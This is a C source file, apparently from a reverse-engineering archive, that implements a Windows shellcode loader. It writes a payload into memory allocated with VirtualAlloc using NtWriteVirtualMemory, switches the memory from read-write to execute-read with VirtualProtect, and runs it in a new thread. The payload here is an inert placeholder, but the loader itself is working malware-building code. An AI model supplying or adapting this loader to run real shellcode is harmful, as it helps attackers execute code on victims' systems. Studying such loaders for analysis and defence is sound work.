/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    NtWriteVirtualMemory
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

#pragma comment(lib,"ntdll")

/* ========= function signatures ========= */
typedef NTSTATUS NtWriteVirtualMemory_t (HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NtWriteVirtualMemory_t FAR * pNtWriteVirtualMemory;

int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    ULONG       nwritten;
    HMODULE     ntdll;

    // function pointer to internal API
    pNtWriteVirtualMemory NtWriteVirtualMemory;

    // resolve all functions
    ntdll = GetModuleHandle("ntdll.dll");
    NtWriteVirtualMemory = (pNtWriteVirtualMemory) GetProcAddress(ntdll, "NtWriteVirtualMemory");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    NtWriteVirtualMemory (GetCurrentProcess(), runtime, payload, payload_len, &nwritten);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    return 0;
}